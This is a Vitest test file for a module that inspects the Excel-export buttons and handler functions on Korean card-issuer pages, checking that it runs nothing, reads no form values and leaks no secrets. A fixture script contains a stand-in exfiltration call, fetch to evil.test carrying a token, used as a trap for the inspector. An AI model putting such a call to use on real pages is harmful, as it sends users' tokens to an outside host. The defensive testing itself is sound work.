import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { JSDOM } from 'jsdom'
import type { Tab } from '../src/main/browser/tab-manager'
import { inspectCardPage } from '../src/main/finance/card-page-diagnostics'
import { inspectCardExportContract } from '../src/main/finance/card-export-diagnostics'

vi.mock('../src/main/finance/card-page-diagnostics', () => ({ inspectCardPage: vi.fn() }))
const windows: JSDOM[] = []
const URLS = {
  hyundai_card: 'https://www.hyundaicard.com/cpa/cb/CPACB0101_01.hc',
  samsung_card: 'https://www.samsungcard.com/personal/card/activity/UHPPRP0801M0.jsp',
  lotte_card: 'https://www.lottecard.co.kr/app/LPMCDAA_V100.lc'
}

function fixture(
  issuer: keyof typeof URLS,
  html = ''
): {
  dom: JSDOM
  tab: Tab
  execute: ReturnType<typeof vi.fn>
  changeUrl: () => void
} {
  let url = URLS[issuer]
  const dom = new JSDOM(html, { url, runScripts: 'outside-only' })
  windows.push(dom)
  const execute = vi.fn(async (code: string, gesture: boolean) => {
    expect(gesture).toBe(false)
    return dom.window.eval(code)
  })
  vi.mocked(inspectCardPage).mockResolvedValue({
    state: 'ready',
    auth: 'signed_in',
    issuer,
    historyUrl: URLS[issuer]
  })
  return {
    dom,
    tab: {
      view: {
        webContents: { getURL: () => url, isDestroyed: () => false, executeJavaScript: execute }
      }
    } as unknown as Tab,
    execute,
    changeUrl: () => {
      url += '?changed=1'
    }
  }
}

beforeEach(() => vi.clearAllMocks())
afterEach(() => {
  for (const dom of windows.splice(0)) dom.window.close()
})

describe('card Excel export contract inspection', () => {
  it('returns only structural facts, without invoking exports, getters or reading form values', async () => {
    const code = `function fnExcelDownload() {
      document.getElementById('historyForm');
      jQuery('#startDt');
      request('/cpa/cb/CPACB0101_20.hc', {password:'PASSWORD_SECRET', body:'TRANSACTION_SECRET'});
      fetch('https://evil.test/private?token=QUERY_SECRET');
    }`
    const f = fixture(
      'hyundai_card',
      `<script>${code}</script>
      <form><input name="startDt" value="FORM_SECRET"><input name="password" value="PASSWORD_SECRET"></form>
      <button id="excelBtn" onclick="fnExcelDownload('HANDLER_SECRET')">엑셀 다운로드</button>
      <p>BODY_SECRET</p>`
    )
    f.dom.window.eval(code)
    const fetch = vi.fn()
    Object.defineProperty(f.dom.window, 'fetch', { value: fetch })
    const getter = vi.fn(() => ({ excel: vi.fn() }))
    Object.defineProperty(f.dom.window, 'EVENT', { get: getter })
    const before = f.dom.window.document.documentElement.outerHTML
    const result = await inspectCardExportContract(f.tab)
    expect(result).toMatchObject({
      state: 'ready',
      issuer: 'hyundai_card',
      export: {
        controls: [
          { tag: 'button', id: 'excelBtn', label: 'excel', handlers: ['fnExcelDownload'] }
        ],
        functions: [
          {
            name: 'fnExcelDownload',
            paths: ['/cpa/cb/CPACB0101_20.hc'],
            selectors: ['historyForm', '#startDt']
          }
        ],
        inputNames: ['startDt', 'password']
      }
    })
    expect(JSON.stringify(result)).not.toMatch(/SECRET|evil\.test|source|body|token/)
    expect(fetch).not.toHaveBeenCalled()
    expect(getter).not.toHaveBeenCalled()
    expect(f.dom.window.document.documentElement.outerHTML).toBe(before)
    expect(inspectCardPage).toHaveBeenCalledTimes(2)
  })

  it('discovers Samsung object methods without executing functions or export-property getters', async () => {
    const f = fixture('samsung_card', '<button onclick="EVENT.excelDownload()">엑셀저장</button>')
    f.dom.window.eval(`window.EVENT = { excelDownload: function () {
      scard.ajax({ service: 'SHPPRP0801S99', endpoint: '/personal/card/activity/UHPPRP0801L0.jsp', secret: 'PAYLOAD_SECRET' });
    }};`)
    const getter = vi.fn()
    Object.defineProperty((f.dom.window as unknown as { EVENT: object }).EVENT, 'exportOther', {
      get: getter
    })
    const result = await inspectCardExportContract(f.tab)
    expect(result).toMatchObject({
      export: {
        functions: [
          {
            name: 'EVENT.excelDownload',
            services: ['SHPPRP0801S99'],
            paths: ['/personal/card/activity/UHPPRP0801L0.jsp']
          }
        ]
      }
    })
    expect(getter).not.toHaveBeenCalled()
    expect(JSON.stringify(result)).not.toContain('PAYLOAD_SECRET')
  })

  it('ignores code-looking strings, comments, JSON scripts and another issuer paths', async () => {
    const code = `function excelExport() { request('/app/LPMCDAA_E100.lc'); request('/cpa/cb/CPACB0101_20.hc'); }
      var message = 'function privateExportSecret() {}';
      // function commentExportSecret() {}
    `
    const f = fixture(
      'lotte_card',
      `<script>${code}</script><script type="application/json">{"fn":"function jsonExportSecret() {}"}</script>`
    )
    f.dom.window.eval(code)
    const result = await inspectCardExportContract(f.tab)
    expect(result).toMatchObject({ state: 'ready', export: { paths: ['/app/LPMCDAA_E100.lc'] } })
    expect(JSON.stringify(result)).not.toMatch(/Secret|CPACB/)
  })

  it('rejects unexpected fields, unscoped paths and cross-issuer metadata', async () => {
    for (const raw of [
      {
        controls: [],
        functions: [],
        paths: [],
        inputNames: [],
        truncated: false,
        cookie: 'PRIVATE_SECRET'
      },
      {
        controls: [],
        functions: [],
        paths: ['/app/LPMCDAA_E100.lc'],
        inputNames: [],
        truncated: false
      },
      {
        controls: [],
        functions: [],
        paths: ['https://evil.test/'],
        inputNames: [],
        truncated: false
      }
    ]) {
      const f = fixture('samsung_card')
      f.execute.mockResolvedValue(raw)
      expect(await inspectCardExportContract(f.tab)).toEqual({ state: 'invalid_result' })
    }
  })

  it('does not inspect signed-out pages and discards navigation changes or exceptions', async () => {
    const f = fixture('lotte_card')
    vi.mocked(inspectCardPage).mockResolvedValueOnce({
      state: 'signed_out',
      auth: 'signed_out',
      issuer: 'lotte_card',
      historyUrl: URLS.lotte_card
    })
    expect(await inspectCardExportContract(f.tab)).toEqual({
      state: 'signed_out',
      auth: 'signed_out'
    })
    expect(f.execute).not.toHaveBeenCalled()
    f.execute.mockImplementationOnce(async (code: string) => {
      const raw = f.dom.window.eval(code)
      f.changeUrl()
      return raw
    })
    expect(await inspectCardExportContract(f.tab)).toEqual({ state: 'navigation_changed' })
    f.execute.mockRejectedValueOnce(new Error('PRIVATE_SECRET'))
    expect(await inspectCardExportContract(f.tab)).toEqual({ state: 'error' })
  })

  it('bounds inspection and does not inspect function sources embedded in overlarge scripts', async () => {
    const f = fixture(
      'hyundai_card',
      `<script>${' '.repeat(250001)}function excelSecret() {}</script>`
    )
    expect(await inspectCardExportContract(f.tab)).toMatchObject({
      state: 'ready',
      export: { functions: [], truncated: true }
    })
  })
})
